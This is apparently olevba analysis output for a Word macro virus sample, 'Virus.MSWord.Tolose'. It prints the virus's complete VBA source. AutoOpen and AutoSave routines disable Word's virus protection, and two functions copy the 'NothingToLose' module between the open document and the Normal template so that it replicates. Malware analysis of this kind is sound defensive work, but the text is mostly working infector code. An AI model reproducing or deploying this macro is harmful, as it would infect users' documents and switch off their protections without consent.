olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tolose
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tolose - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NothingToLose.bas 
in file: Virus.MSWord.Tolose - OLE stream: 'Macros/VBA/NothingToLose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
If Application.Options.VirusProtection = True Then
Application.Options.VirusProtection = False
End If
Macro2
Macro3
End Sub
Sub AutoSave()
On Error GoTo errs
If Application.Options.VirusProtection = True Then
Application.Options.VirusProtection = False
End If
Macro2
Macro3
errs:
Exit Sub
End Sub

Function Macro2()
Attribute Macro2.VB_Description = "Macro recorded 15/06/98 by Pham Hong Thai"
Attribute Macro2.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Macro2"
Dim fr As String
Dim des As String
On Error GoTo errs
des = Application.ActiveDocument.AttachedTemplate.Path & "\" & Application.ActiveDocument.AttachedTemplate.Name
fr = Application.ActiveDocument.Name
    Application.OrganizerCopy Source:= _
        fr, Destination:= _
        des, Name:="NothingToLose", Object:=wdOrganizerObjectProjectItems
errs:
    Exit Function
End Function
Function Macro3()
Dim fr As String
Dim des As String
On Error GoTo errs
fr = Application.MacroContainer.Path & "\" & Application.MacroContainer
des = Application.ActiveDocument.Name
    Application.OrganizerCopy Source:= _
        fr, Destination:= _
        des, Name:="NothingToLose", Object:=wdOrganizerObjectProjectItems
errs:
    Exit Function
End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+----------+--------------------+---------------------------------------------+

